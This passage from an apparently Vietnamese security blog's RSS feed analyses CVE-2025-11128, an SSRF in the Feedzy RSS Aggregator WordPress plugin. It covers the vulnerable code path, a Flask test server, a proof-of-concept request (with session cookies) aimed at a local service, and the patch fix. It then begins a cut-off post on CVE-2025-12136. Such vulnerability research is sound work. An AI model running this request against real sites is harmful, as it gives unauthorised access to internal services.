function init() {&#xA;    // Check absolute bare minimum requirements.&#xA;    if (!extension_loaded(&amp;#39;xml&amp;#39;) || !extension_loaded(&amp;#39;pcre&amp;#39;)) {&#xA;        $this-&amp;gt;error = &amp;#39;XML or PCRE extensions not loaded!&amp;#39;;&#xA;        return false;&#xA;    }&#xA;    // Then check the xml extension is sane (i.e., libxml 2.7.x issue on PHP &amp;lt; 5.2.9 and libxml 2.7.0 to 2.7.2 on any version) if we don&amp;#39;t have xmlreader.&#xA;    elseif (!extension_loaded(&amp;#39;xmlreader&amp;#39;)) {&#xA;        static $xml_is_sane = null;&#xA;        if ($xml_is_sane === null) {&#xA;            $parser_check = xml_parser_create();&#xA;            xml_parse_into_struct($parser_check, &amp;#39;&amp;lt;foo&amp;gt;&amp;amp;amp;&amp;lt;/foo&amp;gt;&amp;#39;, $values);&#xA;            xml_parser_free($parser_check);&#xA;            $xml_is_sane = isset($values[0][&amp;#39;value&amp;#39;]);&#xA;        }&#xA;        if (!$xml_is_sane) {&#xA;            return false;&#xA;        }&#xA;    }&#xA;    ...&#xA;    if ($this-&amp;gt;feed_url === null &amp;amp;&amp;amp; $this-&amp;gt;raw_data === null) {&#xA;        return false;&#xA;    }&#xA;&#xA;    $cache = false;&#xA;    if ($this-&amp;gt;enable_cache) {&#xA;        $cache = $this-&amp;gt;get_cache($this-&amp;gt;feed_url);&#xA;    }&#xA;    if (($fetched = $this-&amp;gt;fetch_data($cache)) === true) {&#xA;        return true;&#xA;    } elseif ($fetched === false) {&#xA;        return false;&#xA;    }&#xA;&#xA;    [$headers, $sniffed] = $fetched;&#xA;&#xA;    if (empty($this-&amp;gt;raw_data)) {&#xA;        $this-&amp;gt;error = &amp;#34;Empty response from `$this-&amp;gt;feed_url`&amp;#34;;&#xA;        return false;&#xA;    }&#xA;&#xA;    // Parse&#xA;    foreach ($this-&amp;gt;get_possible_encodings($headers, $sniffed) as $encoding) {&#xA;        $utf8_data = $this-&amp;gt;convert_to_utf8($this-&amp;gt;raw_data, $encoding);&#xA;        $parser = $this-&amp;gt;registry-&amp;gt;create(Parser::class);&#xA;        if ($parser-&amp;gt;parse($utf8_data, &amp;#39;UTF-8&amp;#39;, $this-&amp;gt;permanent_url)) {&#xA;            $this-&amp;gt;data = $parser-&amp;gt;get_data();&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Ta th·∫•y file ƒë∆∞·ª£c y√™u c·∫ßu ·ªü ƒë√¢u l√† d·∫°ng XML&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;fetch_data($cache)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê√¢y l√† n∆°i th·ª±c hi·ªán HTTP request ƒë·∫øn URL m√† ng∆∞·ªùi d√πng g·ª≠i l√™n.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;    A[&amp;#34;User input via /feedzy/v1/feed (REST API)&amp;#34;] --&amp;gt; B[&amp;#34;feedzy_sanitize_feeds()&amp;#34;]&#xA;    B --&amp;gt; C[&amp;#34;esc_url() ‚Üí no internal host validation&amp;#34;]&#xA;    C --&amp;gt; D[&amp;#34;feedzy_rest_route()&amp;#34;]&#xA;    D --&amp;gt; E[&amp;#34;Feedzy_Rss_Feeds::instance()&amp;#34;]&#xA;    E --&amp;gt; F[&amp;#34;$admin-&amp;gt;fetch_feed(url)&amp;#34;]&#xA;    F --&amp;gt; G{&amp;#34;feedzy_amazon_get_locale_hosts() exists?&amp;#34;}&#xA;    G -- No --&amp;gt; H[&amp;#34;init_feed()&amp;#34;]&#xA;    H --&amp;gt; I[&amp;#34;Feedzy_Rss_Feeds_Util_SimplePie::init()&amp;#34;]&#xA;    I --&amp;gt; J[&amp;#34;fetch_data(cache)&amp;#34;]&#xA;    J --&amp;gt; K[&amp;#34;HTTP request to user-controlled URL ‚Üí SSRF&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, request, send_from_directory, Response&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/feed&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def feed():&#xA;    xml_content = &amp;#34;&amp;#34;&amp;#34;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&#xA;    &amp;lt;rss version=&amp;#34;2.0&amp;#34;&amp;gt;&#xA;      &amp;lt;channel&amp;gt;&#xA;        &amp;lt;title&amp;gt;Example Feed&amp;lt;/title&amp;gt;&#xA;        &amp;lt;link&amp;gt;https://example.com&amp;lt;/link&amp;gt;&#xA;        &amp;lt;description&amp;gt;This is a sample RSS feed generated by Flask.&amp;lt;/description&amp;gt;&#xA;        &amp;lt;item&amp;gt;&#xA;          &amp;lt;title&amp;gt;First item&amp;lt;/title&amp;gt;&#xA;          &amp;lt;link&amp;gt;https://example.com/item1&amp;lt;/link&amp;gt;&#xA;          &amp;lt;description&amp;gt;Hello world!&amp;lt;/description&amp;gt;&#xA;        &amp;lt;/item&amp;gt;&#xA;        &amp;lt;item&amp;gt;&#xA;          &amp;lt;title&amp;gt;Second item&amp;lt;/title&amp;gt;&#xA;          &amp;lt;link&amp;gt;https://example.com/item2&amp;lt;/link&amp;gt;&#xA;          &amp;lt;description&amp;gt;Another entry.&amp;lt;/description&amp;gt;&#xA;        &amp;lt;/item&amp;gt;&#xA;      &amp;lt;/channel&amp;gt;&#xA;    &amp;lt;/rss&amp;gt;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    return Response(xml_content, mimetype=&amp;#39;application/xml&amp;#39;)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login b·∫±ng t√†i kho·∫£n Contributor&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i POST request v·ªõi URL tr·ªè ƒë·∫øn local service:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/feedzy/v1/feed HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F&amp;amp;reauth=1&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cdf597bffe4c239d9e871b2ac98a2d427df0fb82dc7a09099bc026fbbff641ad1; wp-settings-time-2=1761542750; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-time-3=1761591693; wp-settings-3=mfold%3Do; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cd42e05305965ebb0efad0d1374e9552219c641afb6452531634d3b4e414c6a48; wp_lang=en_US&#xA;&#xA;url[0]=http://localhost:8001/feed&amp;amp;category=cat&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/result.png&#34; title=&#34;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/result.png&#39; alt=&#34;Result&#34; height=&#34;938&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi ch√∫&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;N·∫øu th·ª≠ &lt;code&gt;url&lt;/code&gt; v·ªõi file kh√¥ng ph·∫£i d·∫°ng XML, ta nh·∫≠n ƒë∆∞·ª£c response:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/metadata.png&#34; title=&#34;K·∫øt qu·∫£ khi file kh√¥ng thu·ªôc d·∫°ng XML&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/metadata.png&#34; data-sub-html=&#34;&lt;h2&gt;Metadata&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£ khi file kh√¥ng thu·ªôc d·∫°ng XML&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/metadata.png&#39; alt=&#34;Metadata&#34; height=&#34;569&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£ khi file kh√¥ng thu·ªôc d·∫°ng XML&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-11128&lt;/strong&gt; trong plugin &lt;strong&gt;Feedzy RSS Aggregator&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác x·ª≠ l√Ω URL kh√¥ng an to√†n trong REST API &lt;code&gt;/feedzy/v1/feed&lt;/code&gt;.&#xA;H√†m &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; ch·ªâ d√πng &lt;code&gt;esc_url()&lt;/code&gt; m√† kh√¥ng x√°c minh ƒë·ªãa ch·ªâ, cho ph√©p attacker c√≥ quy·ªÅn &lt;strong&gt;Subscriber&lt;/strong&gt; g·ª≠i y√™u c·∫ßu SSRF ƒë·∫øn c√°c d·ªãch v·ª• n·ªôi b·ªô.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;5.1.1&lt;/strong&gt; kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng &lt;code&gt;wp_http_validate_url()&lt;/code&gt;, th·∫Øt ch·∫∑t quy·ªÅn truy c·∫≠p API qua &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt; v√† thay &lt;code&gt;esc_url()&lt;/code&gt; b·∫±ng &lt;code&gt;esc_url_raw()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;esc_url()&lt;/code&gt; kh√¥ng ƒë·ªß ƒë·ªÉ x√°c minh URL ƒë·∫ßu v√†o.&lt;/li&gt;&#xA;&lt;li&gt;REST API c·∫ßn ƒë∆∞·ª£c gi·ªõi h·∫°n quy·ªÅn truy c·∫≠p ph√π h·ª£p.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn x√°c minh v√† l·ªçc URL ƒë·ªÉ ngƒÉn SSRF ƒë·∫øn m·∫°ng n·ªôi b·ªô.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/feedzy-rss-feeds/vulnerability/wordpress-feedzy-rss-feeds-lite-plugin-5-1-0-authenticated-subscriber-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Feedzy Plugin &amp;lt;= 5.1.0 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12136 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-29-cve-2025-12136/</link>
      <pubDate>Wed, 29 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-29-cve-2025-12136/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin The Real Cookie Banner: GDPR &amp;amp; ePrivacy Cookie Consent cho WordPress b·ªã l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 5.2.4. Nguy√™n nh√¢n l√† do ki·ªÉm tra kh√¥ng ƒë·∫ßy ƒë·ªß URL do ng∆∞·ªùi d√πng cung c·∫•p t·∫°i REST API endpoint &lt;code&gt;/scanner/scan-without-login&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p nh·ªØng k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, c√≥ quy·ªÅn truy c·∫≠p c·∫•p administrator tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi c√°c ƒë·ªãa ch·ªâ t√πy √Ω xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ truy v·∫•n v√† s·ª≠a ƒë·ªïi th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô th√¥ng qua tham s·ªë &lt;code&gt;url&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12136&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12136&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.2.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.2.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/real-cookie-banner/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Real Cookie Banner Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 